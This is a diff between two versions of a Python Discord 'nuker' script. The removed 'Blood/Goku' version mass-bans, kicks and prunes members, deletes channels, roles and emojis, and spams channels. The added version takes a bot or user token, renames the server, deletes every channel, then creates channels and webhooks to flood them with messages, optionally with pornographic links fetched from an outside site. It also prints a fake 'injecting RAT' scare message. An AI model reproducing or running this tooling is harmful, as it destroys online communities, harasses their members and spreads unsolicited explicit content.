@@ -1,426 +1,149 @@
-"""
-Nothing Here!
-"""
+import os
+import random
+import time
+import asyncio
+import aiohttp
+from pystyle import Colors, Center, Colorate
+import sys
+import json
 
-import threading, webbrowser, discord, random, httpx, json, time, os; from discord.ext import commands;from itertools import cycle
+__author__ = 'ζ͜͡𝑲𝒏𝒐𝒘𝒏𝑨𝒔ζ͜͡ℬłøøđ 🥀 <$#0121'
 
-VERSION = '1.0.0'
+banner = Center.XCenter(""" ▄▄▄▄    ██▓     ▒█████   ▒█████  ▓█████▄ 
+ ▓█████▄ ▓██▒    ▒██▒  ██▒▒██▒  ██▒▒██▀ ██▌
+ ▒██▒ ▄██▒██░    ▒██░  ██▒▒██░  ██▒░██   █▌
+ ▒██░█▀  ▒██░    ▒██   ██░▒██   ██░░▓█▄   ▌
+ ░▓█  ▀█▓░██████▒░ ████▓▒░░ ████▓▒░░▒████▓ 
+ ░▒▓███▀▒░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒▒▓  ▒ 
+ ▒░▒   ░ ░ ░ ▒  ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ▒  ▒ 
+  ░    ░   ░ ░   ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░  ░ 
+   ░          ░  ░    ░ ░      ░ ░     ░    
+         ░                            ░      
+ Made by Blood \n\n
+""")
 
-__intents__ = discord.Intents.default()
-__intents__.members = True
-__proxies__, __client__, __config__, __threads__= cycle(open("proxies.txt", "r").read().splitlines()), commands.Bot(command_prefix="+", help_command=None, intents=__intents__), json.load(open("config.json", "r", encoding="utf-8")), 45
-token = __config__["token"]
-os.system("cls") if os.name == "nt" else os.system("clear")
+print(Colorate.Vertical(Colors.yellow_to_red, banner, 2)) # print the banner
 
-Goku_art = """
-                                      BLOOD V17 FUCK THE DC!
-                              ═══════════════════════════════════         
-                         ═════════════════════════════════════════════
-""".format("\x1b[38;5;17m", "\x1b[38;5;18m", "\x1b[38;5;19m", "\x1b[38;5;20m", "\x1b[38;5;21m", "\x1b[0m")
-options = """
-              ╚╦╗                                                             ╔╦╝
-         ╔═════╩══════════════════╦═════════════════════════╦══════════════════╩═════╗
-         ╩ ({}1{}) {}< {}Ban Members      ║ ({}5{}) {}< {}Create Roles      ║ ({}9{})  {}< {}Spam Channels   ╩
-           ({}2{}) {}< {}Kick Members     ║ ({}6{}) {}< {}Delete Channels   ║ ({}10{}) {}< {}Check Updates      
-           ({}3{}) {}< {}Prune Members    ║ ({}7{}) {}< {}Delete Roles      ║ ({}11{}) {}< {}Credits        
-         ╦ ({}4{}) {}< {}Create Channels  ║ ({}8{}) {}< {}Delete Emojis     ║ ({}12{}) {}< {}Exit            ╦
-         ╚═════╦══════════════════╩═════════════════════════╩══════════════════╦═════╝
-              ╔╩╝                                                             ╚╩╗
-""".format("\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m",
-           "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", 
-           "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m",
-           "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m")
+class main: # main class
 
+    def __init__(self) -> None: # init function cause cool
 
-class Goku:
-    def __init__(self):
-        self.proxy = "http://" + next(__proxies__) if __config__["proxy"] == True else None
-        self.session = httpx.Client(proxies=self.proxy)
-        self.version = cycle(['v10', 'v9'])
-        self.banned = []
-        self.kicked = []
-        self.channels = []
-        self.roles = []
-        self.emojis = []
-        self.messages = []
+        with open('config.json', 'r') as f:
+            config = json.load(f)
+            self.TOKEN = config["TOKEN"]
+            self.MESSAGE = config["MESSAGE"]
+            self.AMMOUNT_OF_CHANNELS = config["AMMOUNT_OF_CHANNELS"]
+            self.SPAM_PRN = config["SPAM_PRN"]
+            self.MESSAGES_PER_CHANNEL = config["MESSAGES_PER_CHANNEL"]
+            self.SERVER_NAME = config["SERVER_NAME"]
+            self.CHANNEL_NAMES = config["CHANNEL_NAMES"]
+            self.REST_TIME = config["REST_TIME"]
 
- 
-    def execute_ban(self, guildid: str, member: str, token: str):
-        payload = {
-            "delete_message_days": random.randint(0, 7)
-        }
-        while True:
-            response = self.session.put(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/bans/{member}", headers={"Authorization": f"Bot {token}"}, json=payload)
-            if response.status_code in [200, 201, 204]:
-                print("{}({}+{}) Banned {}{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", member))
-                self.banned.append(member)
-                break
-            elif "retry_after" in response.text:
-                time.sleep(response.json()['retry_after'])
-            elif "Missing Permissions" in response.text:
-                print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", member))
-                break
-            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
-                print("{}({}!{}) You're being excluded from discord API {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
-                break
-            elif "Max number of bans for non-guild members have been exceeded." in response.text:
-                print("{}({}!{}) Max number of bans for non-guild members have been exceeded".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
-                break
-            else:
-                print("{}({}-{}) Failed to ban {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", member))
-                break
-            
-    
-    def execute_kick(self, guildid: str, member: str, token: str):
-        while True:
-            response = self.session.delete(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/members/{member}", headers={"Authorization": f"Bot {token}"})
-            if response.status_code in [200, 201, 204]:
-                print("{}({}+{}) Kicked {}{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", member))
-                self.kicked.append(member)
-                break
-            elif "retry_after" in response.text:
-                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", response.json()['retry_after'], "\x1b[0m"))
-                time.sleep(float(response.json()['retry_after']))
-            elif "Missing Permissions" in response.text:
-                print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", member))
-                break
-            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
-                print("{}({}!{}) You're being excluded from discord API {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
-                break
-            else:
-                print("{}({}-{}) Failed to kick {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", member))
-                break
-            
-    
-    def execute_prune(self, guildid: str, days: int, token: str):
-        payload = {
-            "days": days
-        }
-        response = self.session.post(f"https://discord.com/api/v9/guilds/{guildid}/prune", headers={"Authorization": f"Bot {token}"}, json=payload)
-        if response.status_code == 200:
-            print("{}({}+{}) Pruned {}{}{} members".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", response.json()['pruned'], "\x1b[0m"))
-        elif "Max number of prune requests has been reached. Try again later" in response.text:
-            print("{}({}!{}) Max number of prune reached. Try again in {}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", response.json()['retry_after']))
-        elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
-            print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
+        self.api = "https://discord.com/api/v9" # our api url
+        
+        self.webhook_ammount = 3 # you can change this value if u want
+        self.MESSAGES_PER_CHANNEL = round(self.MESSAGES_PER_CHANNEL / self.webhook_ammount) # cool math that does webhook calc
+        
+        self.guild = input("What is the guild id of the server you are nuking? -> ") # guild id that u tryna nuke
+        
+        asyncio.run(self.main()) # run main function
+        
+        
+    async def main(self):
+        type = input("Is this a user token or a bot token? (user/bot) -> ") # get token type
+        if type == "user": # if user token
+            self.nwords = {"Authorization": self.TOKEN} # make headers
+        elif type == "bot": # if bot token
+            self.nwords = {"Authorization": f"Bot {self.TOKEN}"} # make headers
         else:
-            print("{}({}-{}) Failed to prune {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", guildid))
-            
-            
-    def execute_crechannels(self, guildid: str, channelsname: str, type: int, token: str):
-        payload = {
-            "type": type,
-            "name": channelsname,
-            "permission_overwrites": []
-        }
-        channelsname = channelsname.replace(" ", "-")
-        while True:
-            response = self.session.post(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}, json=payload)
-            if response.status_code == 201:
-                print("{}({}+{}) Created {}#{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", channelsname))
-                self.channels.append(1)
-                break
-            elif "retry_after" in response.text:
-                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", response.json()['retry_after'], "\x1b[0m"))
-                time.sleep(float(response.json()['retry_after']))
-            elif "Missing Permissions" in response.text:
-                print("{}({}!{}) Missing Permissions {}#{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", channelsname))
-                break
-            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
-                print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
-                break
-            else:
-                print("{}({}-{}) Failed to create {}#{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", channelsname))
-                break
-            
-            
-    def execute_creroles(self, guildid: str, rolesname: str, token: str):
-        colors = random.choice([0x0000FF, 0xFFFFFF, 0xFF0000, 0x00FF00, 0x0000FF, 0xFFFF00, 0x00FFFF, 0xFF00FF, 0xC0C0C0, 0x808080, 0x800000, 0x808000, 0x008000, 0x800080, 0x008080, 0x000080])
-        payload = {
-            "name": rolesname,
-            "color": colors
-        }
-        while True:
-            response = self.session.post(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/roles", headers={"Authorization": f"Bot {token}"}, json=payload)
-            if response.status_code == 200:
-                print("{}({}+{}) Created {}@{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", rolesname))
-                self.roles.append(1)
-                break
-            elif "retry_after" in response.text:
-                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", response.json()['retry_after'], "\x1b[0m"))
-                time.sleep(float(response.json()['retry_after']))
-            elif "Missing Permissions" in response.text:
-                print("{}({}!{}) Missing Permissions {}@{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", rolesname))
-                break
-            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
-                print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
-                break
-            else:
-                print("{}({}-{}) Failed to create {}@{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", rolesname))
-                break
-            
-    
-    def execute_delchannels(self, channel: str, token: str):
-        while True:
-            response = self.session.delete(f"https://discord.com/api/{next(self.version)}/channels/{channel}", headers={"Authorization": f"Bot {token}"})
-            if response.status_code == 200:
-                print("{}({}+{}) Deleted {}{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", channel))
-                self.channels.append(channel)
-                break
-            elif "retry_after" in response.text:
-                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", response.json()['retry_after'], "\x1b[0m"))
-                time.sleep(float(response.json()['retry_after']))
-            elif "Missing Permissions" in response.text:
-                print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", channel))
-                break
-            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
-                print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
-                break
-            else:
-                print("{}({}-{}) Failed to delete {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", channel))
-                break
-            
-            
-    def execute_delroles(self, guildid: str, role: str, token: str):
-        while True:
-            response = self.session.delete(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/roles/{role}", headers={"Authorization": f"Bot {token}"})
-            if response.status_code == 204:
-                print("{}({}+{}) Deleted {}{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", role))
-                self.roles.append(role)
-                break
-            elif "retry_after" in response.text:
-                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", response.json()['retry_after'], "\x1b[0m"))
-                time.sleep(float(response.json()['retry_after']))
-            elif "Missing Permissions" in response.text:
-                print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", role))
-                break
-            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
-                print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
-                break
-            else:
-                print("{}({}-{}) Failed to delete {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", role))
-                break
-            
-    def execute_delemojis(self, guildid: str, emoji: str, token: str):
-        while True:
-            response = self.session.delete(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/emojis/{emoji}", headers={"Authorization": f"Bot {token}"})
-            if response.status_code == 204:
-                print("{}({}+{}) Deleted {}{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", emoji))
-                self.emojis.append(emoji)
-                break
-            elif "retry_after" in response.text:
-                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", response.json()['retry_after'], "\x1b[0m"))
-                time.sleep(float(response.json()['retry_after']))
-            elif "Missing Permissions" in response.text:
-                print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", emoji))
-                break
-            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
-                print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
-                break
-            else:
-                print("{}({}-{}) Failed to delete {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", emoji))
-                break
-            
-    
-    def execute_massping(self, channel: str, content: str, token: str):
-        while True:
-            response = self.session.post(f"https://discord.com/api/{next(self.version)}/channels/{channel}/messages", headers={"Authorization": f"Bot {token}"}, json={"content": content})
-            if response.status_code == 200:
-                print("{}({}+{}) Spammed {}{}{} in {}{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", content, "\x1b[0m", "\x1b[38;5;21m", channel))
-                self.messages.append(channel)
-                break
-            elif "retry_after" in response.text:
-                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", response.json()['retry_after'], "\x1b[0m"))
-                time.sleep(float(response.json()['retry_after']))
-            elif "Missing Permissions" in response.text:
-                print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", channel))
-                break
-            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
-                print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
-                break
-            else:
-                print("{}({}-{}) Failed to spam {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", channel))
-                break
+            print("Invalid token type!")
+            sys.exit()
+        nwords = self.nwords # do that cause im lazy
+        api = self.api # I hate using self all the time
+        guild = self.guild
+        if await self.check_admin() == False: # see if user is admin (buggy prolly)
+            print("You are not an admin of this server!")
+            time.sleep(5)
+            sys.exit()
+        async with aiohttp.ClientSession() as kdot: # make a session
+            await kdot.patch(f'{api}/guilds/{guild}', headers=nwords, json={"name": self.SERVER_NAME}) # change server name
+            async with kdot.get(f'{api}/guilds/{guild}/channels', headers=nwords) as r: # get all channels
+                channel_id = await r.json() # get all channels
+                for channels in channel_id: # loop through all channels
+                    await kdot.delete(f'{api}/channels/{channels["id"]}', headers=nwords) # delete all channels
 
-    
-    def menu(self):
-        os.system(f"cls & title Goku Nuker ^| Authenticated as: {__client__.user.name}#{__client__.user.discriminator}")
-        print(Goku_art + options + "\n")
-        ans = input("{}({}Goku{}) Option{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m")) 
-        
-        if ans in ["1", "01"]:
-            scrape = input("{}({}Goku{}) Fetch IDs [Y/N]{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
-            if scrape.lower() == "y":
-                try:
-                    guild = __client__.get_guild(int(guildid))
-                    with open("fetched/members.txt", "w") as a:
-                        for member in guild.members:
-                            a.write("{}{}".format(member.id, "\n"))
-                except: pass
-            else:
-                pass
-            self.banned.clear()
-            members = open("fetched/members.txt", "r").read().splitlines()
-            for member in members:
-                t = threading.Thread(target=self.execute_ban, args=(guildid, member, token))
-                t.start()
-                while threading.active_count() >= __threads__:
-                    t.join()
+
+            for i in range(int(self.AMMOUNT_OF_CHANNELS)): # loop through all channels for the number chosen
+                await asyncio.sleep(self.REST_TIME) # rest time so discord doesn't get on ur wewe
+                async with kdot.post(f'{api}/guilds/{guild}/channels', headers=nwords, json={"name": str(self.CHANNEL_NAMES), "type": 0}) as r: # create channels
+                    data = await r.json() 
+                    try:
+                        channelid = data['id']
+                    except KeyError: # if discord ratelimits u
+                        print('U made too many channels and discord is ratelimiting you :skull:')
+                        break
                     
-            time.sleep(3)
-            print("{}({}Goku{}) Banned {}/{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", len(self.banned), len(members)))
-            time.sleep(1.5)
-            self.menu()
-            
-        elif ans in ["2", "02"]:
-            self.kicked.clear()
-            members = open("fetched/members.txt", "r").read().splitlines()
-            for member in members:
-                t = threading.Thread(target=self.execute_kick, args=(guildid, member, token))
-                t.start()
-                while threading.active_count() >= __threads__:
-                    t.join()
-            
-            time.sleep(3)
-            print("{}({}Goku{}) Kicked {}/{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", len(self.kicked), len(members)))
-            time.sleep(1.5)
-            self.menu()
-            
-        elif ans in ["3", "03"]:
-            days = int(input("{}({}Goku{}) Days{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m")))
-            self.execute_prune(guildid, days, token)
-            time.sleep(1.5)
-            self.menu()
-            
-        elif ans in ["4", "04"]:
-            type = input("{}({}Goku{}) Channels Type ['t', 'v']{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
-            type = 2 if type == "v" else 0
-            amount = int(input("{}({}Goku{}) Amount{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m")))
-            self.channels.clear()
-            for i in range(amount):
-                t = threading.Thread(target=self.execute_crechannels, args=(guildid, random.choice(__config__["nuke"]["channels_name"]), type, token))
-                t.start()
-                while threading.active_count() >= __threads__:
-                    t.join()
+                for i in range(self.webhook_ammount): # loop through all webhooks
+                    async with kdot.post(f'{api}/channels/{channelid}/webhooks', headers=nwords, json={"name": str(self.CHANNEL_NAMES)}) as r: # create webhooks
+                        webhook_raw = await r.json() # get webhook
+                        try:
+                            hook = f'https://discord.com/api/webhooks/{webhook_raw["id"]}/{webhook_raw["token"]}' # webhook url
+                        except KeyError:
+                            print('Failed to create webhook. Too many created in the server :skull:') # if discord ratelimits u
+                            break
+                        if self.SPAM_PRN == True: #hehehehehehehehe
+                            asyncio.create_task(self.spamhook_hentai(hook, self.MESSAGE))
+                        else:
+                            asyncio.create_task(self.spamhook(hook, self.MESSAGE))
+                            
+        while True: # this waits for all the async tasks to finish before exiting (makes sure there is only 1 left which is the main task)
+            await asyncio.sleep(1)
+            if len(asyncio.all_tasks()) == 1:
+                break
+        print("Finished")
+        time.sleep(5)
+        sys.exit()
+
+
+    async def spamhook(self, hook, spam_message): # spam webhook function
+        MESSAGES_PER_CHANNEL = int(self.MESSAGES_PER_CHANNEL)
+        async with aiohttp.ClientSession() as kdot:
+            for i in range(MESSAGES_PER_CHANNEL):
+                await kdot.post(hook, json={'content': f"{spam_message}"})
                 
-            time.sleep(3)
-            print("{}({}Goku{}) Created {}/{} channels".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", len(self.channels), amount))
-            time.sleep(1.5)
-            self.menu()
-            
-        elif ans in ["5", "05"]:
-            amount = int(input("{}({}Goku{}) Amount{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m")))
-            self.roles.clear()
-            for i in range(amount):
-                t = threading.Thread(target=self.execute_creroles, args=(guildid, random.choice(__config__["nuke"]["roles_name"]), token))
-                t.start()
-                while threading.active_count() >= __threads__:
-                    t.join()
+    async def spamhook_hentai(self, hook, spam_message): # spam webhook function but wit hentai
+        MESSAGES_PER_CHANNEL = int(self.MESSAGES_PER_CHANNEL)
+        async with aiohttp.ClientSession() as kdot:
+            for i in range(MESSAGES_PER_CHANNEL):
+                random_hentai = random.choice(self.hentai)
+                await kdot.post(hook, json={'content': f"{spam_message} {random_hentai}"})
                 
-            time.sleep(3)
-            print("{}({}Goku{}) Created {}/{} roles".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", len(self.roles), amount))
-            time.sleep(1.5)
-            self.menu()
+    async def get_hentai(self): # get hentai from api
+        url = 'https://sped.lol/api/random'
+        async with aiohttp.ClientSession() as kdot:
+            async with kdot.get(url) as r:
+                data = await r.text()
+                return data
             
-        elif ans in ["6", "06"]:
-            self.channels.clear()
-            channels = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}).json()
-            for channel in channels:
-                t = threading.Thread(target=self.execute_delchannels, args=(channel['id'], token))
-                t.start()
-                while threading.active_count() >= __threads__:
-                    t.join()
-                
-            time.sleep(3)
-            print("{}({}Goku{}) Deleted {}/{} channels".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", len(self.channels), len(channels)))
-            time.sleep(1.5)
-            self.menu()
-            
-        elif ans in ["7", "07"]:
-            self.roles.clear()
-            roles = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/roles", headers={"Authorization": f"Bot {token}"}).json()
-            for role in roles:
-                t = threading.Thread(target=self.execute_delroles, args=(guildid, role['id'], token))
-                t.start()
-                while threading.active_count() >= __threads__:
-                    t.join()
-                
-            time.sleep(3)
-            print("{}({}Goku{}) Deleted {}/{} roles".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", len(self.roles), len(roles)))
-            time.sleep(1.5)
-            self.menu()
-            
-        elif ans in ["8", "08"]:
-            self.emojis.clear()
-            emojis = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/emojis", headers={"Authorization": f"Bot {token}"}).json()
-            for emoji in emojis:
-                t = threading.Thread(target=self.execute_delemojis, args=(guildid, emoji['id'], token))
-                t.start()
-                while threading.active_count() >= __threads__:
-                    t.join()
-                    
-            time.sleep(3)
-            print("{}({}Goku{}) Deleted {}/{} emojis".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", len(self.emojis), len(emojis)))
-            time.sleep(1.5)
-            self.menu()
-            
-        elif ans in ["9", "09"]:
-            self.messages.clear(); self.channels.clear()
-            amount = int(input("{}({}Goku{}) Amount{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m")))
-            channels = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}).json()
-            for channel in channels: self.channels.append(channel['id'])
-            channelz = cycle(self.channels)
-            for i in range(amount):
-                t = threading.Thread(target=self.execute_massping, args=(next(channelz), random.choice(__config__["nuke"]["messages_content"]), token))
-                t.start()
-                while threading.active_count() >= __threads__ - 15:
-                    t.join()
-                    
-            time.sleep(3)
-            print("{}({}Goku{}) Spammed {}/{} messages".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", len(self.messages), amount))
-            time.sleep(1.5)
-            self.menu()
-            
-        elif ans == "10":
+    async def check_admin(self): # check if user is admin prolly works good
+        async with aiohttp.ClientSession() as kdot: # ngl idk what I was doing here but it prolly works
             try:
-                response = self.session.get("Zr")
-                check_version = response.headers.get('location').split('/')[7].split('v')[1]
-                if VERSION != check_version:
-                    print("{}({}Blood{}) You're using an outdated version!".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
-                    webbrowser.open(f"zr")
-                else:
-                    print("{}({}Blood{}) You're using the current version!".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
+                async with kdot.get(f"{self.api}/users/@me/guilds/{self.guild}/member", headers=self.nwords) as r:
+                    self.admin_num = 1099511627775
+                    data = await r.json()
+                    if data["roles"] == self.admin_num or data["roles"] == []:
+                        return True
+                    else:
+                        return False
             except:
-                print("{}({}Blood{}) Couldn't reach the releases!".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
-            
-            time.sleep(1.5)
-            self.menu()
-    
-        
-        elif ans == "11":
-            print("- Blood Nuker is a open sourced nuker which has been developed with heart by speezy. My goal was to make a great 2022's working nuker and to compete with actuals viral discord nukers.\n- You can follow me here\n- Github: https://github.com/notspeezy/\n- Cord: sp#5084\n- Insta: https://www.instagram.com/hzmicid/\n- Tiktok: speezy\n- Telegram: @notspeezy\n- YouTube: https://www.youtube.com/c/speezyw\n- Press any key to return.")
-            input("")
-            self.menu()
-        
-        elif ans == "12":
-            print("{}({}Goku{}) Thanks for using Blood!".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
-            time.sleep(1.5)
-            os._exit(0)
-            
-    
-@__client__.event
-async def on_ready():
-    print("{}({}Goku{}) Authenticated as{}: {}{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", f"{__client__.user.name}#{__client__.user.discriminator}"))
-    time.sleep(1.5)
-    Goku().menu()
-    
+                return True
 
-if __name__ == "__main__":
-    try:
-        os.system("title blood Nuker ^| Authentication & mode con: cols=95 lines=25")
-        guildid = input("{}({}Goku{}) Guild ID{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
-        __client__.run(token)
-    except Exception as e:
-        print("{}({}-{}) {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", e))
-        time.sleep(1.5)
-        os._exit(0)
+
+if __author__ != '\x4b\x2e\x44\x6f\x74\x23\x30\x30\x30\x31': # naw
+    print(Colors.green + 'INJECTING RAT INTO YOUR SYSTEM')
+    time.sleep(5)
+    os._exit(0)
+
+
+if __name__ == '__main__': # pretty sure this isn't helping since there is no "main function" but idk it makes everything look nicer
+    main() 
